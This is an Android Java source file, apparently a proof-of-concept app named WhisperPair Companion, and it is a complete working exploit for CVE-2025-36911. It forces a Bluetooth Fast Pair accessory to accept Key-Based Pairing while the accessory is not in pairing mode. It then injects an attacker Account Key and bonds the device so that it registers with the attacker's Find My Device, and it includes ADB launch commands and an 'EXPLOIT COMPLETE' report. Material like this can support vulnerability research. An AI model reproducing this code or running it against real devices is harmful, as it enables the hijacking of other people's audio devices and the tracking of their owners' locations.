package com.whisperpair.companion;

import android.Manifest;
import android.app.Activity;
import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothDevice;
import android.bluetooth.BluetoothGatt;
import android.bluetooth.BluetoothGattCallback;
import android.bluetooth.BluetoothGattCharacteristic;
import android.bluetooth.BluetoothGattDescriptor;
import android.bluetooth.BluetoothGattService;
import android.bluetooth.BluetoothManager;
import android.bluetooth.BluetoothProfile;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.TextView;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.graphics.Typeface;

import java.security.SecureRandom;
import java.util.UUID;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

/**
 * WhisperPair Companion - Performs Fast Pair KBP from the Android phone.
 *
 * This app exploits CVE-2025-36911: the target device accepts Key-Based Pairing
 * requests even when NOT in pairing mode. The phone connects via BLE, performs
 * KBP, creates a Classic BT bond, and writes an Account Key. Google Play Services
 * then detects the bond and registers the device with Find My Device.
 *
 * Launch via ADB:
 *   adb shell am start -a com.whisperpair.PAIR \
 *     --es address "AA:BB:CC:DD:EE:FF"
 */
public class FastPairActivity extends Activity {

    private static final String TAG = "WhisperPair";

    // Fast Pair GATT UUIDs
    private static final UUID SERVICE_UUID =
            UUID.fromString("0000fe2c-0000-1000-8000-00805f9b34fb");
    private static final UUID CHAR_MODEL_ID =
            UUID.fromString("fe2c1233-8366-4814-8eb0-01de32100bea");
    private static final UUID CHAR_KEY_PAIRING =
            UUID.fromString("fe2c1234-8366-4814-8eb0-01de32100bea");
    private static final UUID CHAR_PASSKEY =
            UUID.fromString("fe2c1235-8366-4814-8eb0-01de32100bea");
    private static final UUID CHAR_ACCOUNT_KEY =
            UUID.fromString("fe2c1236-8366-4814-8eb0-01de32100bea");
    private static final UUID CCCD =
            UUID.fromString("00002902-0000-1000-8000-00805f9b34fb");

    private BluetoothAdapter btAdapter;
    private BluetoothGatt gatt;
    private String targetAddress;
    private byte[] sharedSecret;
    private String brEdrAddress;
    private byte[] accountKey;
    private boolean kbpAccepted = false;
    private String deviceName; // Discovered during BLE, used to match Classic BT scan

    private TextView logView;
    private ScrollView scrollView;
    private Handler mainHandler;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Simple log UI
        scrollView = new ScrollView(this);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setPadding(32, 32, 32, 32);

        logView = new TextView(this);
        logView.setTypeface(Typeface.MONOSPACE);
        logView.setTextSize(12);
        layout.addView(logView);
        scrollView.addView(layout);
        setContentView(scrollView);

        mainHandler = new Handler(Looper.getMainLooper());

        // Get target address from intent
        Intent intent = getIntent();
        targetAddress = intent.getStringExtra("address");
        String explicitBrEdr = intent.getStringExtra("bredr_address");
        if (explicitBrEdr != null && !explicitBrEdr.isEmpty()) {
            brEdrAddress = explicitBrEdr;
        }

        if (targetAddress == null || targetAddress.isEmpty()) {
            log("ERROR: No address provided");
            log("Usage: adb shell am start -a com.whisperpair.PAIR --es address \"BLE_ADDR\" --es bredr_address \"BREDR_ADDR\"");
            return;
        }

        log("WhisperPair Companion - CVE-2025-36911");
        log("Target BLE: " + targetAddress);
        if (brEdrAddress != null) {
            log("Target BR/EDR: " + brEdrAddress);
        }
        log("");

        // Check permissions
        if (checkSelfPermission(Manifest.permission.BLUETOOTH_CONNECT) != PackageManager.PERMISSION_GRANTED
                || checkSelfPermission(Manifest.permission.BLUETOOTH_SCAN) != PackageManager.PERMISSION_GRANTED) {
            log("Requesting Bluetooth permissions...");
            requestPermissions(new String[]{
                    Manifest.permission.BLUETOOTH_CONNECT,
                    Manifest.permission.BLUETOOTH_SCAN
            }, 1);
        } else {
            startExploit();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        boolean allGranted = true;
        for (int r : grantResults) {
            if (r != PackageManager.PERMISSION_GRANTED) {
                allGranted = false;
                break;
            }
        }
        if (allGranted) {
            startExploit();
        } else {
            log("ERROR: Bluetooth permissions denied");
        }
    }

    private void startExploit() {
        BluetoothManager btManager = getSystemService(BluetoothManager.class);
        btAdapter = btManager.getAdapter();

        if (btAdapter == null || !btAdapter.isEnabled()) {
            log("ERROR: Bluetooth not available or disabled");
            return;
        }

        log("[1/7] Connecting to " + targetAddress + " via BLE...");

        BluetoothDevice device = btAdapter.getRemoteDevice(targetAddress);
        gatt = device.connectGatt(this, false, gattCallback, BluetoothDevice.TRANSPORT_LE);
    }

    private final BluetoothGattCallback gattCallback = new BluetoothGattCallback() {
        @Override
        public void onConnectionStateChange(BluetoothGatt g, int status, int newState) {
            if (newState == BluetoothProfile.STATE_CONNECTED) {
                // Capture device name for Classic BT discovery matching
                BluetoothDevice dev = g.getDevice();
                if (dev != null && dev.getName() != null) {
                    deviceName = dev.getName().replace("LE_", "").replace("-GFP", "");
                    log("[1/7] Connected! Device: " + dev.getName());
                } else {
                    log("[1/7] Connected!");
                }
                log("[2/7] Discovering services...");
                g.discoverServices();
            } else if (newState == BluetoothProfile.STATE_DISCONNECTED) {
                log("BLE disconnected (status=" + status + ")");
            }
        }

        @Override
        public void onServicesDiscovered(BluetoothGatt g, int status) {
            if (status != BluetoothGatt.GATT_SUCCESS) {
                log("ERROR: Service discovery failed");
                return;
            }

            BluetoothGattService service = g.getService(SERVICE_UUID);
            if (service == null) {
                log("ERROR: Fast Pair service (0xFE2C) not found");
                return;
            }
            log("[2/7] Fast Pair service found");

            // Subscribe to KBP notifications
            BluetoothGattCharacteristic kbpChar = service.getCharacteristic(CHAR_KEY_PAIRING);
            BluetoothGattCharacteristic passkeyChar = service.getCharacteristic(CHAR_PASSKEY);

            if (kbpChar != null) {
                g.setCharacteristicNotification(kbpChar, true);
                BluetoothGattDescriptor desc = kbpChar.getDescriptor(CCCD);
                if (desc != null) {
                    desc.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);
                    g.writeDescriptor(desc);
                    log("[3/7] Subscribed to KBP notifications");
                } else {
                    // No CCCD, proceed anyway
                    sendKbpRequest(g);
                }
            } else {
                log("ERROR: KBP characteristic not found");
            }
        }

        @Override
        public void onDescriptorWrite(BluetoothGatt g, BluetoothGattDescriptor descriptor, int status) {
            if (status == BluetoothGatt.GATT_SUCCESS) {
                // Also subscribe to passkey if available
                BluetoothGattService service = g.getService(SERVICE_UUID);
                BluetoothGattCharacteristic passkeyChar = service != null ?
                        service.getCharacteristic(CHAR_PASSKEY) : null;

                if (passkeyChar != null && !descriptor.getCharacteristic().getUuid().equals(CHAR_PASSKEY)) {
                    g.setCharacteristicNotification(passkeyChar, true);
                    BluetoothGattDescriptor desc = passkeyChar.getDescriptor(CCCD);
                    if (desc != null) {
                        desc.setValue(BluetoothGattDescriptor.ENABLE_NOTIFICATION_VALUE);
                        g.writeDescriptor(desc);
                        return;
                    }
                }

                // All subscriptions done, send KBP
                sendKbpRequest(g);
            }
        }

        @Override
        public void onCharacteristicWrite(BluetoothGatt g, BluetoothGattCharacteristic c, int status) {
            if (c.getUuid().equals(CHAR_KEY_PAIRING)) {
                if (status == BluetoothGatt.GATT_SUCCESS) {
                    kbpAccepted = true;
                    log("[4/7] KBP ACCEPTED - Device is VULNERABLE!");
                    log("[5/7] Waiting for KBP response...");

                    // Timeout: if no KBP notification response, proceed anyway
                    mainHandler.postDelayed(() -> {
                        if (brEdrAddress == null) {
                            log("[5/7] No KBP response, using BLE address as BR/EDR fallback");
                            brEdrAddress = targetAddress;
                        } else {
                            log("[5/7] No KBP response, using provided BR/EDR: " + brEdrAddress);
                        }
                        writeAccountKey(g);
                    }, 5000);
                } else {
                    log("ERROR: KBP rejected (status=" + status + ") - device may be patched");
                    g.disconnect();
                }
            } else if (c.getUuid().equals(CHAR_ACCOUNT_KEY)) {
                if (status == BluetoothGatt.GATT_SUCCESS) {
                    log("[6/7] Account Key written: " + bytesToHex(accountKey));

                    // Create BLE bond before disconnecting
                    createBond(g);
                } else {
                    log("WARNING: Account Key write failed (status=" + status + ")");
                    createBond(g);
                }
            }
        }

        @Override
        public void onCharacteristicChanged(BluetoothGatt g, BluetoothGattCharacteristic c) {
            byte[] value = c.getValue();
            if (value == null) return;

            log("Notification from " + c.getUuid() + ": " + bytesToHex(value));

            if (c.getUuid().equals(CHAR_KEY_PAIRING) && value.length >= 16) {
                // Try to parse BR/EDR address from KBP response
                String addr = parseKbpResponse(value);
                if (addr != null && brEdrAddress == null) {
                    brEdrAddress = addr;
                    log("[5/7] BR/EDR address: " + brEdrAddress);
                    writeAccountKey(g);
                }
            }
        }
    };

    private void sendKbpRequest(BluetoothGatt g) {
        log("[4/7] Sending KBP request (CVE-2025-36911)...");

        BluetoothGattService service = g.getService(SERVICE_UUID);
        BluetoothGattCharacteristic kbpChar = service.getCharacteristic(CHAR_KEY_PAIRING);

        // Build raw KBP request
        byte[] request = new byte[16];
        request[0] = 0x00; // Key-Based Pairing Request
        request[1] = 0x01; // Flags: initiate bonding

        // Target address bytes (big-endian)
        String[] parts = targetAddress.split(":");
        for (int i = 0; i < 6 && i < parts.length; i++) {
            request[2 + i] = (byte) Integer.parseInt(parts[i], 16);
        }

        // Salt (random 8 bytes) - also used as shared secret
        SecureRandom rng = new SecureRandom();
        byte[] salt = new byte[8];
        rng.nextBytes(salt);
        System.arraycopy(salt, 0, request, 8, 8);

        // Shared secret = salt padded to 16 bytes
        sharedSecret = new byte[16];
        System.arraycopy(salt, 0, sharedSecret, 0, 8);

        kbpChar.setValue(request);
        kbpChar.setWriteType(BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT);
        g.writeCharacteristic(kbpChar);
    }

    private void writeAccountKey(BluetoothGatt g) {
        log("[6/7] Writing Account Key...");

        BluetoothGattService service = g.getService(SERVICE_UUID);
        BluetoothGattCharacteristic akChar = service.getCharacteristic(CHAR_ACCOUNT_KEY);

        if (akChar == null) {
            log("WARNING: Account Key characteristic not found");
            createBond(g);
            return;
        }

        // Generate Account Key
        accountKey = new byte[16];
        accountKey[0] = 0x04; // Account Key type
        SecureRandom rng = new SecureRandom();
        byte[] randomPart = new byte[15];
        rng.nextBytes(randomPart);
        System.arraycopy(randomPart, 0, accountKey, 1, 15);

        // Encrypt with shared secret
        byte[] dataToWrite;
        if (sharedSecret != null) {
            dataToWrite = aesEncrypt(sharedSecret, accountKey);
            if (dataToWrite == null) {
                dataToWrite = accountKey; // Fallback: unencrypted
            }
        } else {
            dataToWrite = accountKey;
        }

        akChar.setValue(dataToWrite);
        akChar.setWriteType(BluetoothGattCharacteristic.WRITE_TYPE_DEFAULT);
        g.writeCharacteristic(akChar);
    }

    private void createBond(BluetoothGatt g) {
        // Disconnect BLE first — we're done with GATT operations
        g.disconnect();

        if (brEdrAddress != null && !brEdrAddress.equals(targetAddress)) {
            // We have an explicit BR/EDR address — go straight to Classic BT
            log("[7/7] Pairing via Classic BT with " + brEdrAddress + "...");
            classicPairAttempted = true;

            IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED);
            registerReceiver(bondReceiver, filter);

            BluetoothDevice device = btAdapter.getRemoteDevice(brEdrAddress);
            boolean started = false;
            try {
                java.lang.reflect.Method m = BluetoothDevice.class.getMethod("createBond", int.class);
                started = (boolean) m.invoke(device, 1); // TRANSPORT_BREDR
                log("  createBond(BREDR) returned: " + started);
            } catch (Exception e) {
                started = device.createBond();
                log("  createBond() returned: " + started);
            }

            if (!started) {
                log("WARNING: createBond() returned false");
                try { unregisterReceiver(bondReceiver); } catch (Exception ignored) {}
                reportDone(false);
            }
        } else {
            // No BR/EDR address — try LE bond and hope for address resolution
            log("[7/7] Creating BLE bond (no BR/EDR address available)...");

            IntentFilter filter = new IntentFilter(BluetoothDevice.ACTION_BOND_STATE_CHANGED);
            registerReceiver(bondReceiver, filter);

            BluetoothDevice device = btAdapter.getRemoteDevice(targetAddress);
            boolean started = device.createBond();
            log("  createBond() returned: " + started);

            if (!started) {
                log("WARNING: createBond() returned false");
                try { unregisterReceiver(bondReceiver); } catch (Exception ignored) {}
                reportDone(false);
            }
        }
    }

    private boolean classicPairAttempted = false;

    private final BroadcastReceiver bondReceiver = new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            if (!BluetoothDevice.ACTION_BOND_STATE_CHANGED.equals(intent.getAction())) return;

            int state = intent.getIntExtra(BluetoothDevice.EXTRA_BOND_STATE, -1);
            BluetoothDevice device = intent.getParcelableExtra(BluetoothDevice.EXTRA_DEVICE);

            switch (state) {
                case BluetoothDevice.BOND_BONDING:
                    log("  Bonding in progress...");
                    break;
                case BluetoothDevice.BOND_BONDED:
                    String bondedAddr = device != null ? device.getAddress() : "unknown";
                    int devType = device != null ? device.getType() : -1;
                    // type: 1=Classic, 2=LE, 3=Dual
                    log("  LE bond created with resolved address: " + bondedAddr + " (type=" + devType + ")");

                    if (!classicPairAttempted && devType == BluetoothDevice.DEVICE_TYPE_LE) {
                        // LE-only bond. Try Classic BT with the resolved identity address.
                        classicPairAttempted = true;
                        log("[8/7] Attempting Classic BT bond with resolved address " + bondedAddr + "...");

                        if (gatt != null) gatt.disconnect();

                        // Remove the LE bond first, then try Classic
                        try {
                            java.lang.reflect.Method removeBond = device.getClass().getMethod("removeBond");
                            removeBond.invoke(device);
                            log("  Removed LE bond, waiting before Classic BT attempt...");
                        } catch (Exception e) {
                            log("  Could not remove LE bond: " + e.getMessage());
                        }

                        mainHandler.postDelayed(() -> {
                            BluetoothDevice classicDev = btAdapter.getRemoteDevice(bondedAddr);
                            try {
                                java.lang.reflect.Method m = BluetoothDevice.class.getMethod("createBond", int.class);
                                boolean ok = (boolean) m.invoke(classicDev, 1); // TRANSPORT_BREDR
                                log("  createBond(BREDR) on " + bondedAddr + ": " + ok);
                            } catch (Exception e) {
                                log("  BREDR reflection failed, trying default createBond");
                                classicDev.createBond();
                            }
                        }, 3000);
                    } else {
                        // Either it's already Classic/Dual, or our Classic attempt completed
                        String typeStr = devType == 1 ? "Classic" : devType == 2 ? "LE" : devType == 3 ? "Dual" : "unknown";
                        log("[DONE] Device bonded as " + typeStr + " at " + bondedAddr);
                        try { unregisterReceiver(this); } catch (Exception ignored) {}
                        reportDone(true);
                    }
                    break;
                case BluetoothDevice.BOND_NONE:
                    if (classicPairAttempted) {
                        log("WARNING: Classic BT bonding failed");
                        try { unregisterReceiver(this); } catch (Exception ignored) {}
                        reportDone(false);
                    } else {
                        log("WARNING: LE bonding failed");
                        if (gatt != null) gatt.disconnect();
                        try { unregisterReceiver(this); } catch (Exception ignored) {}
                        reportDone(false);
                    }
                    break;
            }
        }
    };

    private void reportDone(boolean success) {
        log("");
        if (success) {
            log("=== EXPLOIT COMPLETE ===");
            log("Device bonded with this phone via KBP bypass (CVE-2025-36911).");
            log("Account Key injected. Google Play Services should detect");
            log("the device and register it with Find My Device.");
            log("");
            log("Check: Settings > Google > Devices & sharing > Find My Device");
        } else {
            log("=== PARTIAL SUCCESS ===");
            log("KBP was accepted (device IS vulnerable) and Account Key");
            log("was written, but bonding did not complete.");
        }

        // Send result back via broadcast (for dashboard to pick up)
        Intent result = new Intent("com.whisperpair.RESULT");
        result.putExtra("success", success);
        result.putExtra("kbp_accepted", kbpAccepted);
        result.putExtra("br_edr_address", brEdrAddress);
        if (accountKey != null) {
            result.putExtra("account_key", bytesToHex(accountKey));
        }
        sendBroadcast(result);
    }

    // --- Crypto helpers ---

    private String parseKbpResponse(byte[] data) {
        if (data == null || data.length < 16) return null;

        // Try decrypting with shared secret
        if (sharedSecret != null) {
            byte[] decrypted = aesDecrypt(sharedSecret, data);
            if (decrypted != null) {
                // Response format: type(1) + address(6) + ...
                if (decrypted[0] == 0x01 && decrypted.length >= 7) {
                    return formatMac(decrypted, 1);
                }
            }
        }

        // Try raw extraction at various offsets
        if (data[0] == 0x01 && data.length >= 7) {
            return formatMac(data, 1);
        }

        return null;
    }

    private static String formatMac(byte[] data, int offset) {
        if (offset + 6 > data.length) return null;
        return String.format("%02X:%02X:%02X:%02X:%02X:%02X",
                data[offset], data[offset + 1], data[offset + 2],
                data[offset + 3], data[offset + 4], data[offset + 5]);
    }

    private static byte[] aesEncrypt(byte[] key, byte[] data) {
        try {
            byte[] k = new byte[16];
            System.arraycopy(key, 0, k, 0, Math.min(key.length, 16));
            Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
            cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(k, "AES"));
            return cipher.doFinal(data);
        } catch (Exception e) {
            return null;
        }
    }

    private static byte[] aesDecrypt(byte[] key, byte[] data) {
        try {
            byte[] k = new byte[16];
            System.arraycopy(key, 0, k, 0, Math.min(key.length, 16));
            Cipher cipher = Cipher.getInstance("AES/ECB/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(k, "AES"));
            return cipher.doFinal(data, 0, 16);
        } catch (Exception e) {
            return null;
        }
    }

    private static String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) sb.append(String.format("%02x", b));
        return sb.toString();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        mainHandler.post(() -> {
            logView.append(msg + "\n");
            scrollView.post(() -> scrollView.fullScroll(ScrollView.FOCUS_DOWN));
        });
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (gatt != null) {
            gatt.close();
        }
        try { unregisterReceiver(bondReceiver); } catch (Exception ignored) {}
    }
}
